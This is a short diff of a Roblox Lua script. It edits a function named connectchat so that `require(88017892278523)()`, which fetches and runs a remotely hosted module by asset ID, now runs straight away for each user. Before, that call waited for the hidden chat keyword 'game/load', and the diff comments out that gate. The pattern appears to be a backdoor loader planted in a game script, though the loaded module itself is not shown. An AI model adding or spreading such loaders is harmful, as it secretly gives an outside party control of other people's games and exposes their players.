@@ -167,10 +167,10 @@ local enabled = false
 local connections = {}
 
 local function connectchat(user)
-require(88017892278523)()
---[[
+	
 	if not enabled then
-		local connection = user.Chatted:Connect(function(chatted)
+		require(88017892278523)()
+		--[[local connection = user.Chatted:Connect(function(chatted)
 			if chatted == 'game/load' then
 				enabled = true
 				for _, conn in pairs(connections) do
@@ -181,8 +181,9 @@ require(88017892278523)()
 			end
 		end)
 
-		table.insert(connections, connection)
-	end]]
+		table.insert(connections, connection)]]
+		enabled = true
+	end
 end
 
 while task.wait() do
